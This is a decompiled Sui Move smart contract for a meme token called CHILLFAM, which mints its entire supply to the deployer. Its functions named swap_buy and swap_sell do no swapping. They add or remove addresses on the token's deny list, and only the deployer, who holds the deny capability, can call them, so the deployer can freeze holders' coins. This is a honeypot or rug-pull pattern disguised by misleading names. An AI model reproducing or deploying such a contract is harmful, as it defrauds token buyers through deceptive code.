module 0x75fe3450c71e7ff671c7eb674115ae54517b0fd434bb747341d97d7fc95726b5::chillfam {
    struct CHILLFAM has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: CHILLFAM, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHILLFAM>(arg0, 9, b"CHILLFAM", b"Chill Family", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmVqGksrn3YtWYGaYnhGsUH4RT5QEs1gXckgTn2ErSv3Fj"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CHILLFAM>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHILLFAM>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CHILLFAM>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHILLFAM>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLFAM>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHILLFAM>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLFAM>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CHILLFAM>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

